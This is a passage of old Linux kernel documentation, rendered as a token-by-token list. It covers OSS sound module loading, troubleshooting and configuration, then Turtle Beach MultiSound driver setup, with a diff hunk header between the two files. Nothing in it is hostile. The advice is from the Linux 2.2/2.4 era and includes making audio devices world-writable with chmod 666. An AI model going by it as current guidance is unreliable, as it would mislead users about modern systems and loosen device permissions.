".", "This", "second", "entry", "should", "refer", "to", "the", "new", "module", "names", "for", "example", "sb1", ",", "and", "should", "include", "the", "I", "/", "O", ",", "etc", ".", "for", "the", "second", "sound", "card", ".", "3", ".", "Update", "your", "soundon", ".", "sh", "script", ",", "etc", ".", "Warning", ":", "I", "have", "never", "been", "able", "to", "get", "two", "PnP", "sound", "cards", "of", "the", "same", "type", "to", "load", "at", "the", "same", "time", ".", "I", "have", "tried", "this", "several", "times", "with", "the", "Soundblaster", "Vibra", "16", "cards", ".", "OSS", "has", "indicated", "that", "this", "is", "a", "PnP", "problem", ".", "..", ".", "If", "anyone", "has", "any", "luck", "doing", "this", ",", "please", "send", "me", "an", "E", "-", "MAIL", ".", "PCI", "sound", "cards", "should", "not", "have", "this", "problem", ".", "a", "Since", "this", "was", "originally", "release", ",", "I", "have", "received", "a", "couple", "of", "mails", "from", "people", "who", "have", "accomplished", "this", "!", "NOTE", ":", "In", "Linux", "2", ".", "4", "the", "Sound", "Blaster", "driver", "(", "and", "only", "this", "one", "yet", ")", "supports", "multiple", "cards", "with", "one", "module", "by", "default", ".", "Read", "the", "file", "'", "Soundblaster", "'", "in", "this", "directory", "for", "details", ".", "Sound", "Problems", ":", "=", "==", "==", "==", "==", "==", "==", "==", "First", "RTFM", "(", "including", "the", "troubleshooting", "section", "in", "the", "Sound", "-", "HOWTO", ")", ".", "1", ")", "If", "you", "are", "having", "problems", "loading", "the", "modules", "(", "for", "example", ",", "if", "you", "get", "device", "conflict", "errors", ")", "try", "the", "following", ":", "A", ")", "If", "you", "have", "Win95", "or", "NT", "on", "the", "same", "computer", ",", "write", "down", "what", "addresses", ",", "IRQ", ",", "and", "DMA", "channels", "those", "were", "using", "for", "the", "same", "hardware", ".", "You", "probably", "can", "use", "these", "addresses", ",", "IRQs", ",", "and", "DMA", "channels", ".", "You", "should", "really", "do", "this", "BEFORE", "attempting", "to", "get", "sound", "working", "!", "B", ")", "Check", "(", "cat", ")", "/", "proc", "/", "interrupts", ",", "/", "proc", "/", "ioports", ",", "and", "/", "proc", "/", "dma", ".", "Are", "you", "trying", "to", "use", "an", "address", ",", "IRQ", "or", "DMA", "port", "that", "another", "device", "is", "using", "?", "C", ")", "Check", "(", "cat", ")", "/", "proc", "/", "isapnp", "D", ")", "Inspect", "your", "/", "var", "/", "log", "/", "messages", "file", ".", "Often", "that", "will", "indicate", "what", "IRQ", "or", "IO", "port", "could", "not", "be", "obtained", ".", "E", ")", "Try", "another", "port", "or", "IRQ", ".", "Note", "this", "may", "involve", "using", "the", "PnP", "tools", "to", "move", "the", "sound", "card", "to", "another", "location", ".", "Sometimes", "this", "is", "the", "only", "way", "and", "it", "is", "more", "or", "less", "trial", "and", "error", ".", "2", ")", "If", "you", "get", "motor", "-", "boating", "(", "the", "same", "sound", "or", "part", "of", "a", "sound", "clip", "repeated", ")", ",", "you", "probably", "have", "either", "an", "IRQ", "or", "DMA", "conflict", ".", "Move", "the", "card", "to", "another", "IRQ", "or", "DMA", "port", ".", "This", "has", "happened", "to", "me", "when", "playing", "long", "files", "when", "I", "had", "an", "IRQ", "conflict", ".", "3", ".", "If", "you", "get", "dropouts", "or", "pauses", "when", "playing", "high", "sample", "rate", "files", "such", "as", "using", "mpg123", "or", "x11amp", "/", "xmms", ",", "you", "may", "have", "too", "slow", "of", "a", "CPU", "and", "may", "have", "to", "use", "the", "options", "to", "play", "the", "files", "at", "1", "/", "2", "speed", ".", "For", "example", ",", "you", "may", "use", "the", "-", "2", "or", "-", "4", "option", "on", "mpg123", ".", "You", "may", "also", "get", "this", "when", "trying", "to", "play", "mpeg", "files", "stored", "on", "a", "CD", "-", "ROM", "(", "my", "Toshiba", "T8000", "PII", "/", "366", "sometimes", "has", "this", "problem", ")", ".", "4", ".", "If", "you", "get", "\"", "cannot", "access", "device", "\"", "errors", ",", "your", "/", "dev", "/", "dsp", "files", ",", "etc", ".", "may", "be", "set", "to", "owner", "root", ",", "mode", "600", ".", "You", "may", "have", "to", "use", "the", "command", ":", "chmod", "666", "/", "dev", "/", "dsp", "/", "dev", "/", "mixer", "/", "dev", "/", "audio", "5", ".", "If", "you", "get", "\"", "device", "busy", "\"", "errors", ",", "another", "program", "has", "the", "sound", "device", "open", ".", "For", "example", ",", "if", "using", "the", "Enlightenment", "sound", "daemon", "\"", "esd", "\"", ",", "the", "\"", "esd", "\"", "program", "has", "the", "sound", "device", ".", "If", "using", "\"", "esd", "\"", ",", "please", "RTFM", "the", "docs", "on", "ESD", ".", "For", "example", ",", "esddsp", "<", "program", ">", "may", "be", "used", "to", "play", "files", "via", "a", "non", "-", "esd", "aware", "program", ".", "6", ")", "Ask", "for", "help", "on", "the", "sound", "list", "or", "send", "E", "-", "MAIL", "to", "the", "sound", "driver", "author", "/", "maintainer", ".", "7", ")", "Turn", "on", "debug", "in", "drivers", "/", "sound", "/", "sound_config", ".", "h", "(", "DEB", ",", "DDB", ",", "MDB", ")", ".", "8", ")", "If", "the", "system", "reports", "insufficient", "DMA", "memory", "then", "you", "may", "want", "to", "load", "sound", "with", "the", "\"", "dmabufs", "=", "1", "\"", "option", ".", "Or", "in", "/", "etc", "/", "conf", ".", "modules", "add", "preinstall", "sound", "dmabufs", "=", "1", "This", "makes", "the", "sound", "system", "allocate", "its", "buffers", "and", "hang", "onto", "them", ".", "You", "may", "also", "set", "persistent", "DMA", "when", "building", "a", "2", ".", "4", ".", "x", "kernel", ".", "Configuring", "Sound", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "=", "There", "are", "several", "ways", "of", "configuring", "your", "sound", ":", "1", ")", "On", "the", "kernel", "command", "line", "(", "when", "using", "the", "sound", "driver", "(", "s", ")", "compiled", "in", "the", "kernel", ")", ".", "Check", "the", "driver", "source", "and", "documentation", "for", "details", ".", "2", ")", "On", "the", "command", "line", "when", "using", "insmod", "or", "in", "a", "bash", "script", "using", "command", "line", "calls", "to", "load", "sound", ".", "3", ")", "In", "/", "etc", "/", "modprobe", ".", "d", "/", "*", "conf", "when", "using", "modprobe", ".", "4", ")", "Via", "Red", "Hat", "'", "s", "GPL", "'", "d", "/", "usr", "/", "sbin", "/", "sndconfig", "program", "(", "text", "based", ")", ".", "5", ")", "Via", "the", "OSS", "soundconf", "program", "(", "with", "the", "commercial", "version", "of", "the", "OSS", "driver", ".", "6", ")", "By", "just", "loading", "the", "module", "and", "let", "isapnp", "do", "everything", "relevant", "for", "you", ".", "This", "works", "only", "with", "a", "few", "drivers", "yet", "and", "-", "of", "course", "only", "with", "isapnp", "hardware", ".", "And", "I", "am", "sure", ",", "several", "other", "ways", ".", "Anyone", "want", "to", "write", "a", "linuxconf", "module", "for", "configuring", "sound", "?", "Module", "Loading", ":", "=", "==", "==", "==", "==", "==", "==", "==", "When", "a", "sound", "card", "is", "first", "referenced", "and", "sound", "is", "modular", ",", "the", "sound", "system", "will", "ask", "for", "the", "sound", "devices", "to", "be", "loaded", ".", "Initially", "it", "requests", "that", "the", "driver", "for", "the", "sound", "system", "is", "loaded", ".", "It", "then", "will", "ask", "for", "sound", "-", "slot", "-", "0", ",", "where", "0", "is", "the", "first", "sound", "card", ".", "(", "sound", "-", "slot", "-", "1", "the", "second", "and", "so", "on", ")", ".", "Thus", "you", "can", "do", "alias", "sound", "-", "slot", "-", "0", "sb", "To", "load", "a", "soundblaster", "at", "this", "point", ".", "If", "the", "slot", "loading", "does", "not", "provide", "the", "desired", "device", "-", "for", "example", "a", "soundblaster", "does", "not", "directly", "provide", "a", "midi", "synth", "in", "all", "cases", "then", "it", "will", "request", "\"", "sound", "-", "service", "-", "0", "-", "n", "\"", "where", "n", "is", "0", "Mixer", "2", "MIDI", "3", ",", "4", "DSP", "audio", "For", "example", ",", "I", "use", "the", "following", "to", "load", "my", "Soundblaster", "PCI", "128", "(", "ES", "1371", ")", "card", "first", ",", "followed", "by", "my", "SoundBlaster", "Vibra", "16", "card", ",", "then", "by", "my", "TV", "card", ":", "#", "Load", "the", "Soundblaster", "PCI", "128", "as", "/", "dev", "/", "dsp", ",", "/", "dev", "/", "dsp1", ",", "/", "dev", "/", "mixer", "alias", "sound", "-", "slot", "-", "0", "es1371", "#", "Load", "the", "Soundblaster", "Vibra", "16", "as", "/", "dev", "/", "dsp2", ",", "/", "dev", "/", "mixer1", "alias", "sound", "-", "slot", "-", "1", "sb", "options", "sb", "io", "=", "0x240", "irq", "=", "5", "dma", "=", "1", "dma16", "=", "5", "mpu_io", "=", "0x330", "#", "Load", "the", "BTTV", "(", "TV", "card", ")", "as", "/", "dev", "/", "mixer2", "alias", "sound", "-", "slot", "-", "2", "bttv", "alias", "sound", "-", "service", "-", "2", "-", "0", "tvmixer", "pre", "-", "install", "bttv", "modprobe", "tuner", ";", "modprobe", "tvmixer", "pre", "-", "install", "tvmixer", "modprobe", "msp3400", ";", "modprobe", "tvaudio", "options", "tuner", "debug", "=", "0", "type", "=", "8", "options", "bttv", "card", "=", "0", "radio", "=", "0", "pll", "=", "0", "For", "More", "Information", "(", "RTFM", ")", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "1", ")", "Information", "on", "kernel", "modules", ":", "manual", "pages", "for", "insmod", "and", "modprobe", ".", "2", ")", "Information", "on", "PnP", ",", "RTFM", "manual", "pages", "for", "isapnp", ".", "3", ")", "Sound", "-", "HOWTO", "and", "Sound", "-", "Playing", "-", "HOWTO", ".", "4", ")", "OSS", "'", "s", "WWW", "site", "at", "http", ":", "//", "www", ".", "opensound", ".", "com", ".", "5", ")", "All", "the", "files", "in", "Documentation", "/", "sound", ".", "6", ")", "The", "comments", "and", "code", "in", "linux", "/", "drivers", "/", "sound", ".", "7", ")", "The", "sndconfig", "and", "rhsound", "documentation", "from", "Red", "Hat", ".", "8", ")", "The", "Linux", "-", "sound", "mailing", "list", ":", "sound", "-", "list", "@", "redhat", ".", "com", ".", "9", ")", "Enlightenment", "documentation", "(", "for", "info", "on", "esd", ")", "http", ":", "//", "www", ".", "tux", ".", "org", "/", "~", "ricdude", "/", "EsounD", ".", "html", ".", "10", ")", "ALSA", "home", "page", ":", "http", ":", "//", "www", ".", "alsa", "-", "project", ".", "org", "/", "Contact", "Information", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "Wade", "Hampton", ":", "(", "whampton", "@", "staffnet", ".", "com", ")", "@", "@", "-", "1", ",", "1137", "+", "0", ",", "0", "@", "@", "#", "!", "/", "bin", "/", "sh", "#", "#", "Turtle", "Beach", "MultiSound", "Driver", "Notes", "#", "-", "-", "Andrew", "Veliath", "<", "andrewtv", "@", "usa", ".", "net", ">", "#", "#", "Last", "update", ":", "September", "10", ",", "1998", "#", "Corresponding", "msnd", "driver", ":", "0", ".", "8", ".", "3", "#", "#", "*", "*", "This", "file", "is", "a", "README", "(", "top", "part", ")", "and", "shell", "archive", "(", "bottom", "part", ")", ".", "#", "The", "corresponding", "archived", "utility", "sources", "can", "be", "unpacked", "by", "#", "running", "`", "sh", "MultiSound", "'", "(", "the", "utilities", "are", "only", "needed", "for", "the", "#", "Pinnacle", "and", "Fiji", "cards", ")", ".", "*", "*", "#", "#", "#", "-", "=-", "=-", "Getting", "Firmware", "-", "=-", "=", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~", "#", "#", "See", "the", "section", "`", "Obtaining", "and", "Creating", "Firmware", "Files", "'", "in", "this", "#", "document", "for", "instructions", "on", "obtaining", "the", "necessary", "firmware", "#", "files", ".", "#", "#", "#", "Supported", "Features", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~", "#", "#", "Currently", ",", "full", "-", "duplex", "digital", "audio", "(", "/", "dev", "/", "dsp", "only", ",", "/", "dev", "/", "audio", "is", "#", "not", "currently", "available", ")", "and", "mixer", "functionality", "(", "/", "dev", "/", "mixer", ")", "are", "#", "supported", "(", "memory", "mapped", "digital", "audio", "is", "not", "yet", "supported", ")", ".", "#", "Digital", "transfers", "and", "monitoring", "can", "be", "done", "as", "well", "if", "you", "have", "#", "the", "digital", "daughterboard", "(", "see", "the", "section", "on", "using", "the", "S", "/", "PDIF", "port", "#", "for", "more", "information", ")", ".", "#", "#", "Support", "for", "the", "Turtle", "Beach", "MultiSound", "Hurricane", "architecture", "is", "#", "composed", "of", "the", "following", "modules", "(", "these", "can", "also", "operate", "compiled", "#", "into", "the", "kernel", ")", ":", "#", "#", "msnd", "-", "MultiSound", "base", "(", "requires", "soundcore", ")", "#", "#", "msnd_classic", "-", "Base", "audio", "/", "mixer", "support", "for", "Classic", ",", "Monetery", "and", "#", "Tahiti", "cards", "#", "#", "msnd_pinnacle", "-", "Base", "audio", "/", "mixer", "support", "for", "Pinnacle", "and", "Fiji", "cards", "#", "#", "#", "Important", "Notes", "-", "Read", "Before", "Using", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "#", "#", "The", "firmware", "files", "are", "not", "included", "(", "may", "change", "in", "future", ")", ".", "You", "#", "must", "obtain", "these", "images", "from", "Turtle", "Beach", "(", "they", "are", "included", "in", "#", "the", "MultiSound", "Development", "Kits", ")", ",", "and", "place", "them", "in", "/", "etc", "/", "sound", "for", "#", "example", ",", "and", "give", "the", "full", "paths", "in", "the", "Linux", "configuration", ".", "If", "#", "you", "are", "compiling", "in", "support", "for", "the", "MultiSound", "driver", "rather", "than", "#", "using", "it", "as", "a", "module", ",", "these", "firmware", "files", "must", "be", "accessible", "#", "during", "kernel", "compilation", ".", "#", "#", "Please", "note", "these", "files", "must", "be", "binary", "files", ",", "not", "assembler", ".", "See", "#", "the", "section", "later", "in", "this", "document", "for", "instructions", "to", "obtain", "these", "#", "files", ".", "#", "#", "#", "Configuring", "Card", "Resources", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~", "#", "#", "*", "*", "This", "section", "is", "very", "important", ",", "as", "your", "card", "may", "not", "work", "at", "all", "#", "or", "your", "machine", "may", "crash", "if", "you", "do", "not", "do", "this", "correctly", ".", "*", "*", "#", "#", "*", "Classic", "/", "Monterey", "/", "Tahiti", "#", "#", "These", "cards", "are", "configured", "through", "the", "driver", "msnd_classic", ".", "You", "must", "#", "know", "the", "io", "port", ",", "then", "the", "driver", "will", "select", "the", "irq", "and", "memory", "resources", "#", "on", "the", "card", ".", "It", "is", "up", "to", "you", "to", "know", "if", "these", "are", "free", "locations", "or", "now", ",", "#", "a", "conflict", "can", "lock", "the", "machine", "up", ".", "#", "#", "*", "Pinnacle", "/", "Fiji", "#", "#", "The", "Pinnacle", "and", "Fiji", "cards", "have", "an", "extra", "config", "port", ",", "either", "#", "0x250", ",", "0x260", "or", "0x270", ".", "This", "port", "can", "be", "disabled", "to", "have", "the", "card", "#", "configured", "strictly", "through", "PnP", ",", "however", "you", "lose", "the", "ability", "to", "#", "access", "the", "IDE", "controller", "and", "joystick", "devices", "on", "this", "card", "when", "#", "using", "PnP", ".", "The", "included", "pinnaclecfg", "program", "in", "this", "shell", "archive", "#", "can", "be", "used", "to", "configure", "the", "card", "in", "non", "-", "PnP", "mode", ",", "and", "in", "PnP", "mode", "#", "you", "can", "use", "isapnptools", ".", "These", "are", "described", "briefly", "here", ".", "#", "#", "pinnaclecfg", "is", "not", "required", ";", "you", "can", "use", "the", "msnd_pinnacle", "module", "#", "to", "fully", "configure", "the", "card", "as", "well", ".", "However", ",", "pinnaclecfg", "can", "be", "#", "used", "to", "change", "the", "resource", "values", "of", "a", "particular", "device", "after", "the", "#", "msnd_pinnacle", "module", "has", "been", "loaded", ".", "If", "you", "are", "compiling", "the", "#", "driver", "into", "the", "kernel", ",", "you", "must", "set", "these", "values", "during", "compile", "#", "time", ",", "however", "other", "peripheral", "resource", "values", "can", "be", "changed", "with", "#", "the", "pinnaclecfg", "program", "after", "the", "kernel", "is", "loaded", ".", "#", "#", "#", "*", "**", "PnP", "mode", "#", "#", "Use", "pnpdump", "to", "obtain", "a", "sample", "configuration", "if", "you", "can", ";", "I", "was", "able", "#", "to", "obtain", "one", "with", "the", "command", "`", "pnpdump", "1", "0x203", "'", "-", "-", "this", "may", "vary", "#", "for", "you", "(", "running", "pnpdump", "by", "itself", "did", "not", "work", "for", "me", ")", ".", "Then", ",", "#", "edit", "this", "file", "and", "use", "isapnp", "to", "uncomment", "and", "set", "the", "card", "values", ".", "#", "Use", "these", "values", "when", "inserting", "the", "msnd_pinnacle", "module", ".", "Using", "#", "this", "method", ",", "you", "can", "set", "the", "resources", "for", "the", "DSP", "and", "the", "Kurzweil", "#", "synth", "(", "Pinnacle", ")", ".", "Since", "Linux", "does", "not", "directly", "support", "PnP", "#", "devices", ",", "you", "may", "have", "difficulty", "when", "using", "the", "card", "in", "PnP", "mode", "#", "when", "it", "the", "driver", "is", "compiled", "into", "the", "kernel", ".", "Using", "non", "-", "PnP", "mode", "#", "is", "preferable", "in", "this", "case", ".", "#", "#", "Here", "is", "an", "example", "mypinnacle", ".", "conf", "for", "isapnp", "that", "sets", "the", "card", "to", "#", "io", "base", "0x210", ",", "irq", "5", "and", "mem", "0xd8000", ",", "and", "also", "sets", "the", "Kurzweil", "#", "synth", "to", "0x330", "and", "irq", "9", "(", "may", "need", "editing", "for", "your", "system", ")", ":", "#", "#", "(", "READPORT", "0x0203", ")", "#", "(", "CSN", "2", ")", "#", "(", "IDENTIFY", "*", ")", "#", "#", "#", "DSP", "#", "(", "CONFIGURE", "BVJ0440", "/", "-", "1", "(", "LD", "0", "#", "(", "INT", "0", "(", "IRQ", "5", "(", "MODE", "+", "E", ")", "))", "(", "IO", "0", "(", "BASE", "0x0210", ")", ")", "(", "MEM", "0", "(", "BASE", "0x0d8000", ")", ")", "#", "(", "ACT", "Y", ")", "))", "#", "#", "#", "Kurzweil", "Synth", "(", "Pinnacle", "Only", ")", "#", "(", "CONFIGURE", "BVJ0440", "/", "-", "1", "(", "LD", "1", "#", "(", "IO", "0", "(", "BASE", "0x0330", ")", ")", "(", "INT", "0", "(", "IRQ", "9", "(", "MODE", "+", "E", ")", "))", "#", "(", "ACT", "Y", ")", "))", "#", "#", "(", "WAITFORKEY", ")", "#", "#", "#", "*", "**", "Non", "-", "PnP", "mode", "#", "#", "The", "second", "way", "is", "by", "running", "the", "card", "in", "non", "-", "PnP", "mode", ".", "This", "#", "actually", "has", "some", "advantages", "in", "that", "you", "can", "access", "some", "other", "#", "devices", "on", "the", "card", ",", "such", "as", "the", "joystick", "and", "IDE", "controller", ".", "To", "#", "configure", "the", "card", ",", "unpack", "this", "shell", "archive", "and", "build", "the", "#", "pinnaclecfg", "program", ".", "Using", "this", "program", ",", "you", "can", "assign", "the", "#", "resource", "values", "to", "the", "card", "'", "s", "devices", ",", "or", "disable", "the", "devices", ".", "As", "#", "an", "alternative", "to", "using", "pinnaclecfg", ",", "you", "can", "specify", "many", "of", "the", "#", "configuration", "values", "when", "loading", "the", "msnd_pinnacle", "module", "(", "or", "#", "during", "kernel", "configuration", "when", "compiling", "the", "driver", "into", "the", "#", "kernel", ")", ".", "#", "#", "If", "you", "specify", "cfg", "=", "0x250", "for", "the", "msnd_pinnacle", "module", ",", "it", "#", "automatically", "configure", "the", "card", "to", "the", "given", "io", ",", "irq", "and", "memory", "#", "values", "using", "that", "config", "port", "(", "the", "config", "port", "is", "jumper", "selectable", "#", "on", "the", "card", "to", "0x250", ",", "0x260", "or", "0x270", ")", ".", "#", "#", "See", "the", "`", "msnd_pinnacle", "Additional", "Options", "'", "section", "below", "for", "more", "#", "information", "on", "these", "parameters", "(", "also", ",", "if", "you", "compile", "the", "driver", "#", "directly", "into", "the", "kernel", ",", "these", "extra", "parameters", "can", "be", "useful", "#", "here", ")", ".", "#", "#", "#", "*", "*", "It", "is", "very", "easy", "to", "cause", "problems", "in", "your", "machine", "if", "you", "choose", "a", "#", "resource", "value", "which", "is", "incorrect", ".", "*", "*", "#", "#", "#", "Examples", "#", "~", "~~", "~~", "~~", "~", "#", "#", "*", "MultiSound", "Classic", "/", "Monterey", "/", "Tahiti", ":", "#", "#", "modprobe", "soundcore", "#", "insmod", "msnd", "#", "insmod", "msnd_classic", "io", "=", "0x290", "irq", "=", "7", "mem", "=", "0xd0000", "#", "#", "*", "MultiSound", "Pinnacle", "in", "PnP", "mode", ":", "#", "#", "modprobe", "soundcore", "#", "insmod", "msnd", "#", "isapnp", "mypinnacle", ".", "conf", "#", "insmod", "msnd_pinnacle", "io", "=", "0x210", "irq", "=", "5", "mem", "=", "0xd8000", "<", "--", "match", "mypinnacle", ".", "conf", "values", "#", "#", "*", "MultiSound", "Pinnacle", "in", "non", "-", "PnP", "mode", "(", "replace", "0x250", "with", "your", "configuration", "port", ",", "#", "one", "of", "0x250", ",", "0x260", "or", "0x270", ")", ":", "#", "#", "insmod", "soundcore", "#", "insmod", "msnd", "#", "insmod", "msnd_pinnacle", "cfg", "=", "0x250", "io", "=", "0x290", "irq", "=", "5", "mem", "=", "0xd0000", "#", "#", "*", "To", "use", "the", "MPU", "-", "compatible", "Kurzweil", "synth", "on", "the", "Pinnacle", "in", "PnP", "#", "mode", ",", "add", "the", "following", "(", "assumes", "you", "did", "`", "isapnp", "mypinnacle", ".", "conf", "'", "):", "#", "#", "insmod", "sound", "#", "insmod", "mpu401", "io", "=", "0x330", "irq", "=", "9", "<", "--", "match", "mypinnacle", ".", "conf", "values", "#", "#", "*", "To", "use", "the", "MPU", "-", "compatible", "Kurzweil", "synth", "on", "the", "Pinnacle", "in", "non", "-", "PnP", "#", "mode", ",", "add", "the", "following", ".", "Note", "how", "we", "first", "configure", "the", "peripheral", "'", "s", "#", "resources", ",", "_then_", "install", "a", "Linux", "driver", "for", "it", ":", "#", "#", "insmod", "sound", "#", "pinnaclecfg", "0x250", "mpu", "0x330", "9", "#", "insmod", "mpu401", "io", "=", "0x330", "irq", "=", "9", "#", "#", "-", "-", "OR", "you", "can", "use", "the", "following", "sequence", "without", "pinnaclecfg", "in", "non", "-", "PnP", "mode", ":", "#", "#", "insmod", "soundcore", "#", "insmod", "msnd", "#", "insmod", "msnd_pinnacle", "cfg", "=", "0x250", "io", "=", "0x290", "irq", "=", "5", "mem", "=", "0xd0000", "mpu_io", "=", "0x330", "mpu_irq", "=", "9", "#", "insmod", "sound", "#", "insmod", "mpu401", "io", "=", "0x330", "irq", "=", "9", "#", "#", "*", "To", "setup", "the", "joystick", "port", "on", "the", "Pinnacle", "in", "non", "-", "PnP", "mode", "(", "though", "#", "you", "have", "to", "find", "the", "actual", "Linux", "joystick", "driver", "elsewhere", ")", ",", "you", "#", "can", "use", "pinnaclecfg", ":", "#", "#", "pinnaclecfg", "0x250", "joystick", "0x200", "#", "#", "-", "-", "OR", "you", "can", "configure", "this", "using", "msnd_pinnacle", "with", "the", "following", ":", "#", "#", "insmod", "soundcore", "#", "insmod", "msnd", "#", "insmod", "msnd_pinnacle", "cfg", "=", "0x250", "io", "=", "0x290", "irq", "=", "5", "mem", "=", "0xd0000", "joystick_io", "=", "0x200", "#", "#", "#", "msnd_classic", ",", "msnd_pinnacle", "Required", "Options", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~", "#", "#", "If", "the", "following", "options", "are", "not", "given", ",", "the", "module", "will", "not", "load", ".", "#", "Examine", "the", "kernel", "message", "log", "for", "informative", "error", "messages", ".", "#", "WARNING", "-", "-", "probing", "isn", "'", "t", "supported", "so", "try", "to", "make", "sure", "you", "have", "the", "#", "correct", "shared", "memory", "area", ",", "otherwise", "you", "may", "experience", "problems", ".", "#", "#", "io", "I", "/", "O", "base", "of", "DSP", ",", "e", ".", "g", ".", "io", "=", "0x210", "#", "irq", "IRQ", "number", ",", "e", ".", "g", ".", "irq", "=", "5", "#", "mem", "Shared", "memory", "area", ",", "e", ".", "g", ".", "mem", "=", "0xd8000", "#", "#", "#", "msnd_classic", ",", "msnd_pinnacle", "Additional", "Options", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~", "#", "#", "fifosize", "The", "digital", "audio", "FIFOs", ",", "in", "kilobytes", ".", "If", "not", "#", "specified", ",", "the", "default", "will", "be", "used", ".", "Increasing", "#", "this", "value", "will", "reduce", "the", "chance", "of", "a", "FIFO", "#", "underflow", "at", "the", "expense", "of", "increasing", "overall", "#", "latency", ".", "For", "example", ",", "fifosize", "=", "512", "will", "#", "allocate", "512kB", "read", "and", "write", "FIFOs", "(", "1MB", "total", ")", ".", "#", "While", "this", "may", "reduce", "dropouts", ",", "a", "heavy", "machine", "#", "load", "will", "undoubtedly", "starve", "the", "FIFO", "of", "data", "#", "and", "you", "will", "eventually", "get", "dropouts", ".", "One", "#", "option", "is", "to", "alter", "the", "scheduling", "priority", "of", "#", "the", "playback", "process", ",", "using", "`", "nice", "'", "or", "some", "form", "#", "of", "POSIX", "soft", "real", "-", "time", "scheduling", ".", "#", "#", "calibrate_signal", "Setting", "this", "to", "one", "calibrates", "the", "ADCs", "to", "the", "#", "signal", ",", "zero", "calibrates", "to", "the", "card", "(", "defaults", "#", "to", "zero", ")", ".", "#", "#", "#", "msnd_pinnacle", "Additional", "Options", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~", "#", "#", "digital", "Specify", "digital", "=", "1", "to", "enable", "the", "S", "/", "PDIF", "input", "#", "if", "you", "have", "the", "digital", "daughterboard", "#", "adapter", ".", "This", "will", "enable", "access", "to", "the", "#", "DIGITAL1", "input", "for", "the", "soundcard", "in", "the", "mixer", ".", "#", "Some", "mixer", "programs", "might", "have", "trouble", "setting", "#", "the", "DIGITAL1", "source", "as", "an", "input", ".", "If", "you", "have", "#", "trouble", ",", "you", "can", "try", "the", "setdigital", ".", "c", "program", "#", "at", "the", "bottom", "of", "this", "document", ".", "#", "#", "cfg", "Non", "-", "PnP", "configuration", "port", "for", "the", "Pinnacle", "#", "and", "Fiji", "(", "typically", "0x250", ",", "0x260", "or", "0x270", ",", "#", "depending", "on", "the", "jumper", "configuration", ")", ".", "If", "#", "this", "option", "is", "omitted", ",", "then", "it", "is", "assumed", "#", "that", "the", "card", "is", "in", "PnP", "mode", ",", "and", "that", "the", "#", "specified", "DSP", "resource", "values", "are", "already", "#", "configured", "with", "PnP", "(", "i", ".", "e", ".", "it", "won", "'", "t", "attempt", "to", "#", "do", "any", "sort", "of", "configuration", ")", ".", "#", "#", "When", "the", "Pinnacle", "is", "in", "non", "-", "PnP", "mode", ",", "you", "can", "use", "the", "following", "#", "options", "to", "configure", "particular", "devices", ".", "If", "a", "full", "specification", "#", "for", "a", "device", "is", "not", "given", ",", "then", "the", "device", "is", "not", "configured", ".", "Note", "#", "that", "you", "still", "must", "use", "a", "Linux", "driver", "for", "any", "of", "these", "devices", "#", "once", "their", "resources", "are", "setup", "(", "such", "as", "the", "Linux", "joystick", "driver", ",", "#", "or", "the", "MPU401", "driver", "from", "OSS", "for", "the", "Kurzweil", "synth", ")", ".", "#", "#", "mpu_io", "I", "/", "O", "port", "of", "MPU", "(", "on", "-", "board", "Kurzweil", "synth", ")", "#", "mpu_irq", "IRQ", "of", "MPU", "(", "on", "-", "board", "Kurzweil", "synth", ")", "#", "ide_io0", "First", "I", "/", "O", "port", "of", "IDE", "controller", "#", "ide_io1", "Second", "I", "/", "O", "port", "of", "IDE", "controller", "#", "ide_irq", "IRQ", "IDE", "controller", "#", "joystick_io", "I", "/", "O", "port", "of", "joystick", "#", "#", "#", "Obtaining", "and", "Creating", "Firmware", "Files", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "#", "#", "For", "the", "Classic", "/", "Tahiti", "/", "Monterey", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "#", "#", "Download", "to", "/", "tmp", "and", "unzip", "the", "following", "file", "from", "Turtle", "Beach", ":", "#", "#", "ftp", ":", "//", "ftp", ".", "voyetra", ".", "com", "/", "pub", "/", "tbs", "/", "msndcl", "/", "msndvkit", ".", "zip", "#", "#", "When", "unzipped", ",", "unzip", "the", "file", "named", "MsndFiles", ".", "zip", ".", "Then", "copy", "the", "#", "following", "firmware", "files", "to", "/", "etc", "/", "sound", "(", "note", "the", "file", "renaming", ")", ":", "#", "#", "cp", "DSPCODE", "/", "MSNDINIT", ".", "BIN", "/", "etc", "/", "sound", "/", "msndinit", ".", "bin", "#", "cp", "DSPCODE", "/", "MSNDPERM", ".", "REB", "/", "etc", "/", "sound", "/", "msndperm", ".", "bin", "#", "#", "When", "configuring", "the", "Linux", "kernel", ",", "specify", "/", "etc", "/", "sound", "/", "msndinit", ".", "bin", "and", "#", "/", "etc", "/", "sound", "/", "msndperm", ".", "bin", "for", "the", "two", "firmware", "files", "(", "Linux", "kernel", "#", "versions", "older", "than", "2", ".", "2", "do", "not", "ask", "for", "firmware", "paths", ",", "and", "are", "#", "hardcoded", "to", "/", "etc", "/", "sound", ")", ".", "#", "#", "If", "you", "are", "compiling", "the", "driver", "into", "the", "kernel", ",", "these", "files", "must", "#", "be", "accessible", "during", "compilation", ",", "but", "will", "not", "be", "needed", "later", ".", "#", "The", "files", "must", "remain", ",", "however", ",", "if", "the", "driver", "is", "used", "as", "a", "module", ".", "#", "#", "#", "For", "the", "Pinnacle", "/", 